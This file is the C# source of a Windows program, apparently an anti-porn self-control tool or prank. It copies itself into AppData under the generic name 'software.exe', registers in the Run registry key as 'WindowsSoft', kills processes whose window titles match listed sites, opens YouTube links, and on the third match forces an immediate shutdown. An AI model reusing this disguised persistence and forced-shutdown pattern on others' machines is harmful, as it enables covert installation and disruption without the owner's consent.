using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace NoCumToday
{
    class Program
    {



        public static int i = 0;
        static void Main(string[] args)
        {
            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string cDirectory = Environment.CurrentDirectory;
            string ePath = Process.GetCurrentProcess().MainModule.FileName;
            if (appdata != cDirectory)
            {
                File.Copy(ePath, appdata + "\\software.exe",true);
                Directory.SetCurrentDirectory(appdata);
                System.Diagnostics.Process.Start("software.exe");
                
                AddStartup("WindowsSoft", appdata + "\\software.exe");
                Thread.Sleep(5000);
                
            }
            else
            {
                while (true)
                {
                    Detect();

                }
            }
            

        }
        public static void Detect()
        {
            Process[] processlist = Process.GetProcesses();

            foreach (Process process in processlist)
            {
                if (!String.IsNullOrEmpty(process.MainWindowTitle))
                {


                    string sites = Config.PornServices[i];
                    if (Config.PornServices.Any(process.MainWindowTitle.ToLower().Trim().Contains))
                    {
                        KillProcessAndChildren(process.Id);
                        i = i + 1;
                        if (i == 1)
                        {

                            MessageBox.Show("you are better then this -_-");
                            System.Diagnostics.Process.Start("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
                        }
                       

                        
                        else if (i == 2)
                        {
                            MessageBox.Show("alright maybe try some hardbass ");
                            
                            System.Diagnostics.Process.Start("https://www.youtube.com/watch?v=NqM032dnPtk");
                        }
                        else if (i == 3)
                        {
                            MessageBox.Show("you need to calm down");
                            System.Diagnostics.Process.Start("shutdown", "/s /t 0");
                        }
                        





                    }




                }
            }
        }
        private static void KillProcessAndChildren(int pid)
        {
            if (pid == 0)
            {
                return;
            }
            ManagementObjectSearcher searcher = new ManagementObjectSearcher
                    ("Select * From Win32_Process Where ParentProcessID=" + pid);
            ManagementObjectCollection moc = searcher.Get();
            foreach (ManagementObject mo in moc)
            {
                KillProcessAndChildren(Convert.ToInt32(mo["ProcessID"]));
            }
            try
            {
                Process proc = Process.GetProcessById(pid);
                proc.Kill();
            }
            catch (ArgumentException)
            {
                



            }

        }
        public static void AddStartup(string appName, string path)
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.SetValue(appName, "\"" + path + "\"");
            }
        }



    }
}